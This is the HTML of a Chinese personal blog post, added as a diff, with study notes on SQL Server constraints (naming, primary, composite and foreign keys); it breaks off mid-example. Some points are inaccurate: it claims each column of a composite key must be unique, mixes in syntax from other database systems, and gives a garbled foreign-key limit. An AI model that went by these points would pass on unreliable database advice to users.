@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Sqlserver学习 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='计算机基础, 数据库' />
+  <meta itemprop="name" content="sqlserver学习">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="1174">
+  <meta itemprop="keywords" content="计算机基础,数据库"><meta property="og:url" content="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93/79/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="sqlserver学习">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="计算机基础">
+    <meta property="article:tag" content="数据库">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="sqlserver学习">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93/79/" /><link rel="prev" href="https://dongyu29.github.io/posts/owasp/sql%E6%B3%A8%E5%85%A5/117/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/66/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "sqlserver学习",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80\/%E6%95%B0%E6%8D%AE%E5%BA%93\/79\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "计算机基础, 数据库","wordcount":  1174 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80\/%E6%95%B0%E6%8D%AE%E5%BA%93\/79\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Sqlserver学习</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Sqlserver学习</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-category" title="Category - 计算机基础"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 计算机基础</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1174 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="基础" class="heading-element"><span>0.0.0.1  基础</span>
+  <a href="#%e5%9f%ba%e7%a1%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="约束" class="heading-element"><span>0.0.0.1.1  约束</span>
+  <a href="#%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://www.jb51.net/article/248801.htm"target="_blank" rel="external nofollow noopener noreferrer">https://www.jb51.net/article/248801.htm</a></p>
+<h6 id="关键字" class="heading-element"><span>0.0.0.1.2  关键字</span>
+  <a href="#%e5%85%b3%e9%94%ae%e5%ad%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### CONSTRAINT</p>
+<ol>
+<li>
+<p>创建表时定义约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">CREATE</span> <span style="color:#ff636f">TABLE</span> 表名 (
+</span></span><span style="display:flex;"><span>  列名 数据类型 <span style="color:#ff636f">CONSTRAINT</span> 约束名 约束规则,
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>在上述示例中，您可以在列定义之后使用<span style="color:#58a1dd">CONSTRAINT来为该列定义一个约束</span>。约束规则可以是主键约束、唯一约束、外键约束、检查约束等。</span></span></code></pre></div></li>
+<li>
+<p>在已存在的表上添加约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">ALTER</span> <span style="color:#ff636f">TABLE</span> 表名
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">ADD</span> <span style="color:#ff636f">CONSTRAINT</span> 约束名 约束规则;
+</span></span><span style="display:flex;"><span>使用<span style="color:#ff636f">ALTER</span> <span style="color:#58a1dd">TABLE语句</span>，您可以在已存在的表上添加新的约束。约束规则的类型可以是上述列出的任何一种。</span></span></code></pre></div></li>
+<li>
+<p>修改或删除约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">ALTER</span> <span style="color:#ff636f">TABLE</span> 表名
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">DROP</span> <span style="color:#ff636f">CONSTRAINT</span> 约束名;
+</span></span><span style="display:flex;"><span>使用<span style="color:#ff636f">ALTER</span> <span style="color:#58a1dd">TABLE语句</span>，您可以修改或删除已存在的约束。通过指定约束名，您可以删除特定的约束。</span></span></code></pre></div></li>
+</ol>
+<p>####### ALTER</p>
+<p>ALTER是SQL语句中用于修改数据库对象（如表、列、约束等）的关键字</p>
+<ol>
+<li>
+<p>ALTER TABLE（修改表）：</p>
+<ul>
+<li>
+<p>添加列：</p>
+<pre tabindex="0"><code>ALTER TABLE 表名
+ADD 列名 数据类型;</code></pre></li>
+<li>
+<p>修改列的数据类型：</p>
+<pre tabindex="0"><code>ALTER TABLE 表名
+ALTER COLUMN 列名 TYPE 新数据类型;</code></pre></li>
+<li>
+<p>修改列名：</p>
+<pre tabindex="0"><code>ALTER TABLE 表名
+RENAME COLUMN 旧列名 TO 新列名;</code></pre></li>
+<li>
+<p>删除列：</p>
+<pre tabindex="0"><code>ALTER TABLE 表名
+DROP COLUMN 列名;</code></pre></li>
+</ul>
+</li>
+<li>
+<p>ALTER CONSTRAINT（修改约束）：</p>
+<ul>
+<li>
+<p>修改约束名：</p>
+<pre tabindex="0"><code>ALTER TABLE 表名
+RENAME CONSTRAINT 旧约束名 TO 新约束名;</code></pre></li>
+<li>
+<p>禁用约束：</p>
+<pre tabindex="0"><code>ALTER TABLE 表名
+DISABLE CONSTRAINT 约束名;</code></pre></li>
+<li>
+<p>启用约束：</p>
+<pre tabindex="0"><code>ALTER TABLE 表名
+ENABLE CONSTRAINT 约束名;</code></pre></li>
+</ul>
+</li>
+<li>
+<p>ALTER INDEX（修改索引）：</p>
+<ul>
+<li>
+<p>重命名索引：</p>
+<pre tabindex="0"><code>ALTER INDEX 旧索引名
+RENAME TO 新索引名;</code></pre></li>
+<li>
+<p>重建索引：</p>
+<pre tabindex="0"><code>ALTER INDEX 索引名
+REBUILD;</code></pre></li>
+</ul>
+</li>
+</ol>
+<h6 id="一分类" class="heading-element"><span>0.0.0.1.3  一、分类</span>
+  <a href="#%e4%b8%80%e5%88%86%e7%b1%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在SQL Server中，有3种不同类型的约束。</p>
+<ul>
+<li>实体约束
+实体约束是关于行的，比如某一行出现的值就不允许出现在其他行，例如==主键==。</li>
+<li>域约束
+域约束是关于列的，对于所有行，某一列有那些约束，例如CHECK约束。</li>
+<li>参照完整性约束
+如果某列的值必须与其他列的值匹配，那就意味着需要一个参照完整性约束，例如外键。</li>
+</ul>
+<h6 id="二约束命名" class="heading-element"><span>0.0.0.1.4  二、约束命名</span>
+  <a href="#%e4%ba%8c%e7%ba%a6%e6%9d%9f%e5%91%bd%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在学习约束之前，首先来了解下为约束命名需要注意哪些地方。</p>
+<p>SQL Server在我们不提供名称时，会自动创建名称，但是由系统自动创建的名称并不是特别有用。</p>
+<p>例如，系统生成的主键名称可能是这样的：PK_Employees_145C0A3F。</p>
+<p>PK代表主键(primary key)，Employees代表在Employees表中，而剩下的“145C0A3F”部分是为了保证唯一性而随机生成的值。只有通过脚本创建才会得到这种值，如果是通过Managerment Studio创建表，那么就直接是PK_Employees。</p>
+<p>对于系统自动生成的Check约束名称如：CK_Customers_22AA2996。CK代表这是一个Check约束,Customers代表是在Customers表中，后面的22AA2996还是一个随机数。如果一个表中有多个Check约束，则命名可能如下：</p>
+<p>CK_Customers_22AA2996</p>
+<p>CK_Customers_25869641</p>
+<p>CK_Customers_267ABA7A</p>
+<p>如果你需要修改这些约束其中的一个，那么你很难分辨这些约束到底是哪一个。</p>
+<p>因此，为了能够一眼看上去就知道这个约束是用来干什么的，我们应该使用一种简单明了的短语来进行命名。</p>
+<p>例如要确保某一列电话号码格式正确的约束，我们可以使用命名CK_Customers_PhoneNo这样的短语来命名。</p>
+<p>总之命名要做到以下几点：</p>
+<ul>
+<li>一致性</li>
+<li>通俗易懂</li>
+<li>满足以上两个条件的情况下简化名称。</li>
+</ul>
+<h6 id="三主键约束" class="heading-element"><span>0.0.0.1.5  三、<strong>主键约束</strong></span>
+  <a href="#%e4%b8%89%e4%b8%bb%e9%94%ae%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>主键是每行的唯一标识符，仅仅通过它就能准确定位到一行，其中主键列在整个表中不能有重复，必须包含唯一的值(不能为NULL)。由于主键在关系数据库中的重要性，因此它是所有键和约束中最重要的。</p>
+<p>下面来说说主键的创建方式</p>
+<p>####### 1、在创建表的时候创建主键约束。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">create</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">customer</span>
+</span></span><span style="display:flex;"><span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">customerId</span>        <span style="color:#58a1dd">int</span> <span style="color:#ff636f">identity</span>    <span style="color:#ff636f">not</span> <span style="color:#ff636f">null</span>  <span style="color:#ff636f">primary</span> <span style="color:#ff636f">key</span>,<span style="color:#828b96;font-style:italic">--创建主键约束
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">CustomerName</span>    <span style="color:#58a1dd">nvarchar</span>(<span style="color:#a6be9d">30</span>)    <span style="color:#ff636f">not</span> <span style="color:#ff636f">null</span>
+</span></span><span style="display:flex;"><span>);</span></span></code></pre></div><p>####### 2、在已存在的表上创建主键约束</p>
+<p>现在假设已经存在了一张表，但是还没有主键约束：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">alter</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">person</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">add</span> <span style="color:#ff636f">constraint</span> <span style="color:#58a1dd">PK_Employee_Id</span>  <span style="color:#828b96;font-style:italic">--外键名称
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#ff636f">primary</span> <span style="color:#ff636f">key</span>(<span style="color:#58a1dd">personId</span>)          <span style="color:#828b96;font-style:italic">--personId 字段名</span></span></span></code></pre></div><p>alter名称告诉SQL Server如下信息：</p>
+<ul>
+<li>添加了一些内容到表中(也可以删除表中的某些内容)</li>
+<li>添加了什么内容(一个约束)</li>
+<li>对约束的命名(允许以后直接访问约束)</li>
+<li>约束的类型(主键约束)</li>
+<li>约束应用于哪个列。</li>
+</ul>
+<blockquote>
+<p><code>ALTER</code> 是用于修改数据库表的关键字。它允许你对现有表进行结构上的更改，包括添加、修改或删除列，修改表的约束条件，以及修改表的其他属性。</p>
+</blockquote>
+<p>####### 3、复合主键的创建</p>
+<blockquote>
+<p>复合主键（Composite Primary Key）是指由多个列组成的主键，用于唯一标识数据库表中的每一行数据。与单一主键不同，复合主键由两个或多个列的组合形成，并且每个列的值都必须唯一。</p>
+</blockquote>
+<p>如果实在Management Studio中，创建复合主键，只需要按住Ctrl键，选中两个列，然后设置为主键就OK了，非常简单。下面主要讲述使用T-SQL创建复合主键的方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">ALTER</span> <span style="color:#ff636f">TABLE</span> 表名 <span style="color:#ff636f">WITH</span> <span style="color:#58a1dd">NOCHECK</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">ADD</span> <span style="color:#ff636f">CONSTRAINT</span> [<span style="color:#58a1dd">PK_表名</span>] 
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">PRIMARY</span> <span style="color:#ff636f">KEY</span> <span style="color:#58a1dd">NONCLUSTERED</span> ( [字段名<span style="color:#a6be9d">1</span>], [字段名<span style="color:#a6be9d">2</span>] )</span></span></code></pre></div><p>在多对多联系中，常常会有一张表来描述其他两张表的关系，就以此读者和书为例子：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">ALTER</span> <span style="color:#ff636f">TABLE</span> <span style="color:#58a1dd">ReaderAndBook</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">ADD</span> <span style="color:#ff636f">CONSTRAINT</span> [<span style="color:#58a1dd">PK_ReaderAndBook</span>] 
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">PRIMARY</span> <span style="color:#ff636f">KEY</span> <span style="color:#58a1dd">NONCLUSTERED</span> ( <span style="color:#58a1dd">ReaderId</span>, <span style="color:#58a1dd">BookId</span> )</span></span></code></pre></div><h6 id="四外键约束" class="heading-element"><span>0.0.0.1.6  四、外键约束</span>
+  <a href="#%e5%9b%9b%e5%a4%96%e9%94%ae%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>外键既能确保数据完整性，也能表现表之间的关系。添加了外键之后，插入引用表的记录要么必须被引用表中被引用列的某条记录匹配，要么外键列的值必须设置为NULL。</p>
+<p>外键和主键不一样，每个表中的外键数目不限制唯一性。在每个表中，每一有-~253个外键。唯一的限制是一个列只能引用一个外键。一个列可以被多个外键引用。</p>
+<p>####### 4.1、创建表的时候创建外键</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff636f">create</span> <span style="color:#ff636f">table</span> <span style="color:#58a1dd">orders</span>
+</span></span><span style="display:flex;"><span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">orderId</span>       <span style="color:#58a1dd">int</span> <span style="color:#ff636f">identity</span>    <span style="color:#ff636f">not</span> <span style="color:#ff636f">null</span>   <span style="color:#ff636f">primary</span> <span style="color:#ff636f">key</span>,
